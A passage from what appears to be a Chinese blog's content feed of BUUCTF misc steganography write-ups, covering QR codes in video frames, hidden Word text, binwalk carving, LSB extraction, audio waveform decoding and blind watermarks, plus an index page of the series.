                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta044.jpg"
                      alt="atta044"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta117.jpg"
                      alt="atta117"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta215.jpg"
                      alt="atta215"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta272.jpg"
                      alt="atta272"
                ></p>
<p>依次扫码可以得到一串字符串<code>iwantplayctf</code>，然而这不是正常的flag</p>
<p>用打开MP4，看到最后又隐藏着一串Base64编码的文件，分离后解压需要的密码就是我们上一步得到的字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920021750863.png"
                      alt="image-20240920021750863"
                ></p>
<p>解码后保存为.zip文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920022208085.png"
                      alt="image-20240920022208085"
                ></p>
<p>输入密码，得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920022320794.png"
                      alt="image-20240920022320794"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920022415831.png"
                      alt="image-20240920022415831"
                ></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>提交的时候需要将<code>roarctf</code>改为<code>flag</code>来提交</p>

  </div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较综合的题目，考察了视频帧与key组合，加上文件尾隐藏还是比较好玩的，可以亲自去试试</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.4.2%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][2019RoarCTF]%E9%BB%84%E9%87%91%206%20%E5%B9%B4" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-隐藏文字</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/</url>
    <content><![CDATA[<h1 id="Word文档隐写-隐藏文字"><a href="#Word文档隐写-隐藏文字" class="headerlink" title="[Word文档隐写]隐藏文字"></a>[Word文档隐写]隐藏文字</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>打开文档，发现是空白的，根据题目是有关隐藏文字隐写，直接全选文字，取消整体隐藏文字</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001717304.png"
                      alt="image-20240921001717304"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001847756.png"
                      alt="image-20240921001847756"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001809037.png"
                      alt="image-20240921001809037"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001858168.png"
                      alt="image-20240921001858168"
                ></p>
<p>可以看到很简单就拿到了flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>又是一篇小水文~ε٩(๑&gt; ₃ &lt;)۶з</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>图种</title>
    <url>/2024/09/18/ctf/writeup/misc/buuctf/%E5%9B%BE%E7%A7%8D/</url>
    <content><![CDATA[<h1 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>由于是misc类，根据题目使用数据分离工具<a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（kali）</p>
<blockquote>
<p>需要加上 –run-as&#x3D;root 给权限</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%9B%BE%E7%A7%8D/image-20240919000345254.png"
                      alt="image-20240919000345254"
                ></p>
<p>图中可以看到有我们的flag文件，直接到生成的文件夹找到并打开文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%9B%BE%E7%A7%8D/image-20240919000651144.png"
                      alt="image-20240919000651144"
                ></p>
<p>恭喜，你找到了flag！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道多文件包含为图片格式的图种隐写，后续肯定会结合着考，所以也要重视这些简单的</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.1%20%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2]%E5%9B%BE%E7%A7%8D" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-解压2</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/</url>
    <content><![CDATA[<h1 id="Word文档隐写-解压2"><a href="#Word文档隐写-解压2" class="headerlink" title="[Word文档隐写]解压2"></a>[Word文档隐写]解压2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>根据题目提示是要以压缩包的形式打开word文档</p>
<p>修改文档后缀为.zip，并解压</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/image-20240921002233006.png"
                      alt="image-20240921002233006"
                ></p>
<p>这里可以每个手动去查找，也可以借用工具直接查找文本内容，这里提供<a class="link"   href="https://www.52pojie.cn/thread-1858771-1-1.html" >文件搜索工具 FileLocator Pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>这道题比较特殊，直接查找文本是找不到的，所以我们的flag可能不在这里面，或者说是以其他文件形式存在比如png图片等</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/image-20240921003133417.png"
                      alt="image-20240921003133417"
                ></p>

  <div class="note-large info">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>一般word压缩包隐写的图片存放在.&#x2F;word.&#x2F;media文件目录下面</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/image-20240921004432396.png"
                      alt="image-20240921004432396"
                ></p>
<p>通过查找，成功找到隐藏在图片里面的flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道需要自行查找文件的docx文档隐写，前提要知道能够通过修改扩展名来找到隐藏内容，工具搜索不到文本内容就可能是以其他形式存在，不要遗漏掉</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E8%A7%A3%E5%8E%8B2" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>波形图</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E6%B3%A2%E5%BD%A2%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个音频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011449684.png"
                      alt="image-20240920011449684"
                ></p>
<p>用<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将其打开，对于波形图的题来说一般隐藏文件会存在开端或者结尾，不然选手很难找到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011609290.png"
                      alt="image-20240920011609290"
                ></p>
<p>隐藏文件在最最最前面，放大去看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011701066.png"
                      alt="image-20240920011701066"
                ></p>
<p>根据这段奇怪的波形图，将正值写为1，负值写为0，会得到一串二进制码，再用脚本将其转换为ASCII码即可得到flag</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">7</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">7</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;W0W*funny&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这类音频的题型要合理根据题目来做题，多练多熟悉</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.3%20%E6%B3%A2%E5%BD%A2%E5%9B%BE]04" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>最低有效位（LSB）</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/</url>
    <content><![CDATA[<h1 id="最低有效位（LSB）"><a href="#最低有效位（LSB）" class="headerlink" title="最低有效位（LSB）"></a>最低有效位（LSB）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>根据题目LSB隐写，使用工具<a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>对其进行提取</p>
<blockquote>
<p>工具需要java环境</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919174523222.png"
                      alt="image-20240919174523222"
                ></p>
<p>通过各种尝试，导出最后的文件，拿到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/image-20240919175550151.png"
                      alt="image-20240919175550151"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>隐写题根据题目用工具多次尝试即可，主要在于实操</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.3%20%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8DLSB]lsb" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>盲水印</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
    <content><![CDATA[<h1 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个压缩包的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E7%9B%B2%E6%B0%B4%E5%8D%B0/image-20240919190149795.png"
                      alt="image-20240919190149795"
                ></p>
<p>压缩包会给两个图片，一看blind2就大一点，也就是有盲水印在里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E7%9B%B2%E6%B0%B4%E5%8D%B0/image-20240919190321553.png"
                      alt="image-20240919190321553"
                ></p>
<p>用工具进行还原<a class="link"   href="https://github.com/chishaxie/BlindWaterMark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>不要去github搜索下成<a class="link"   href="https://github.com/fire-keeper/BlindWatermark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了，这个是新的，需要看redeme的参数，本案例用的是上面的提供的</p>
</blockquote>

  <div class="note p-4 mb-4 rounded-small red">
    <p>我真的服这本书了，已经第几次因为提供的案例和工具对不上和浪费了很多时间，真的是作者就不能把工具给完吗，每次试错都搞得我头大（╬￣皿￣） </p>

  </div>

<p>参考系数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yuantu.png</td>
<td>原来的没有水印的图片</td>
</tr>
<tr>
<td>shuiyintu.png</td>
<td>有水印的图片</td>
</tr>
<tr>
<td>result_1.png</td>
<td>合成的有水印的图片</td>
</tr>
<tr>
<td>result_2.png</td>
<td>提取的水印图片</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png result_1.png result_2.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png result_1.png result_2.png</span><br></pre></td></tr></table></figure></div>

<p>在windows系统用py3进行提取</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 bwmforpy3.py encode blind1.png blind2.png result.png</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185229567.png"
                      alt="image-20240919185229567"
                ></p>
<p>看到成功提取出来了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185257272.png"
                      alt="image-20240919185257272"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当一个工具出现了大量和书本或者参考不同的错误的时候，要注意是不是工具找错了</p>
<blockquote>
<p>再吐槽一次，我真的是找个工具都要这么费力，服了山(≧皿≦)山 </p>
</blockquote>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.4%20%E7%9B%B2%E6%B0%B4%E5%8D%B0]%E7%9B%B2%E6%B0%B4%E5%8D%B0" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>附加字符串</title>
    <url>/2024/09/18/ctf/writeup/misc/buuctf/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>由于是misc类，根据题目猜测是图片隐写，用<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234824530.png"
                      alt="image-20240918234824530"
                ></p>
<p>搜索<code>flag</code>，果然被隐藏了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道基础的图片隐写题目，没有太多可说的</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.1%20%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2]%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>misc安全目录</title>
    <url>/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及题目难度进行排序）</p>
<p><a href="#ctfhub">ctfhub</a></p>
<p><a href="#buuctf">buuctf</a></p>
<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2><p>1. </p>
<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><ol>
<li><a href="/2024/09/18/ctf/writeup/misc/buuctf/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="附加字符串">附加字符串</a></li>
<li><a href="/2024/09/18/ctf/writeup/misc/buuctf/%E5%9B%BE%E7%A7%8D/" title="图种">图种</a></li>
<li><a href="/2024/09/18/ctf/writeup/misc/buuctf/EXIF/" title="EXIF">EXIF</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/" title="最低有效位（LSB）">最低有效位（LSB）</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E7%9B%B2%E6%B0%B4%E5%8D%B0/" title="盲水印">盲水印</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%5BNISACTF-2022%5Dhuaji/" title="NISACTF-2022-huaji？">[NISACTF-2022]huaji</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/" title="莫尔斯电码">莫尔斯电码</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E6%B3%A2%E5%BD%A2%E5%9B%BE/" title="波形图">波形图</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E9%A2%91%E8%B0%B1%E5%9B%BE/" title="频谱图">频谱图</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%5BSCTF2021%5Din_the_vaporwaves/" title="SCTF 2021-in_the_vaporwaves">[SCTF2021]in_the_vaporwaves</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/" title="2019RoarCTF-黄金6年">[2019RoarCTF]黄金6年</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/" title="Word文档隐写-字体颜色">[Word文档隐写]字体颜色</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/" title="Word文档隐写-隐藏文字">[Word文档隐写]隐藏文字</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/" title="Word文档隐写-解压1">[Word文档隐写]解压1</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/" title="Word文档隐写-解压2">[Word文档隐写]解压2</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BUTCTF2020%5Ddocx/" title="UTCTF2020-docx">[UTCTF2020]docx</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/" title="PDF文档隐写-pdf隐写">[PDF文档隐写]pdf隐写</a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>频谱图</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E9%A2%91%E8%B0%B1%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个音频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011449684.png"
                      alt="image-20240920011449684"
                ></p>
<p>用<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将其打开，对于频谱图的题来说可以随手打开频谱图看看，万一就是呢</p>
<blockquote>
